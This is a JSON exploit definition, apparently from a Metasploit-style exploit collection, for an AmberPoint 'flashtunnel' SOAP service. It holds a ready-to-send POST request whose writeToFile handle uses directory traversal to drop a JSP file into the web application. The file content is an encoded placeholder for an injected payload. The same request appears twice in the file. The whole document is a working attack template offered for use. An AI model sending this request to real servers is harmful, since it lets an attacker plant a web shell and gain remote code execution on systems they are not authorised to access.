MSFExploits/soa/MSF/flash_svc.json

{
   "requests" : {
      "EXPLOIT1" : {
         "TEXT" : "Sending Exploit #1 Request : [POST] /",
         "HEADERS" : {
            "Content-Type" : "text/xml;charset=UTF-8"
         },
         "PAYLOAD" : "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:int=\"http://schemas.amberpoint.com/flashtunnel/interfaces\" xmlns:typ=\"http://schemas.amberpoint.com/flashtunnel/types\">\t<soapenv:Header/>\t<soapenv:Body>\t\t<int:writeToFileRequest>\t\t\t<int:writeToFile handle=\"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\server\\examples\\build\\mainWebApp\\qftIZrcj.jsp\">\t\t\t\t<typ:text>&#x5f;&#x5f;&#x50;&#x41;&#x59;&#x4c;&#x4f;&#x41;&#x44;&#x5f;&#x5f;</typ:text>\t\t\t\t<typ:WriteToFileRequestVersion>\t\t\t\t</typ:WriteToFileRequestVersion>\t\t\t</int:writeToFile>\t\t</int:writeToFileRequest>\t</soapenv:Body></soapenv:Envelope>",
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "PATH" : "",
         "METHOD" : "POST"
      }
   },
   "detection" : {},
   "informations" : {
      "name" : "flash_svc",
      "REQUESTS" : {
         "EXPLOIT1" : {
            "TEXT" : "Sending Exploit #1 Request : [POST] /",
            "HEADERS" : {
               "Content-Type" : "text/xml;charset=UTF-8"
            },
            "PAYLOAD" : "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:int=\"http://schemas.amberpoint.com/flashtunnel/interfaces\" xmlns:typ=\"http://schemas.amberpoint.com/flashtunnel/types\">\t<soapenv:Header/>\t<soapenv:Body>\t\t<int:writeToFileRequest>\t\t\t<int:writeToFile handle=\"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\server\\examples\\build\\mainWebApp\\qftIZrcj.jsp\">\t\t\t\t<typ:text>&#x5f;&#x5f;&#x50;&#x41;&#x59;&#x4c;&#x4f;&#x41;&#x44;&#x5f;&#x5f;</typ:text>\t\t\t\t<typ:WriteToFileRequestVersion>\t\t\t\t</typ:WriteToFileRequestVersion>\t\t\t</int:writeToFile>\t\t</int:writeToFileRequest>\t</soapenv:Body></soapenv:Envelope>",
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "PATH" : "",
            "METHOD" : "POST"
         }
      },
      "TYPE" : "MSF",
      "PLATFORM" : "btmui"
   },
   "name" : "flash_svc",
   "type" : "MSF",
   "platform" : "btmui",
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/"
}
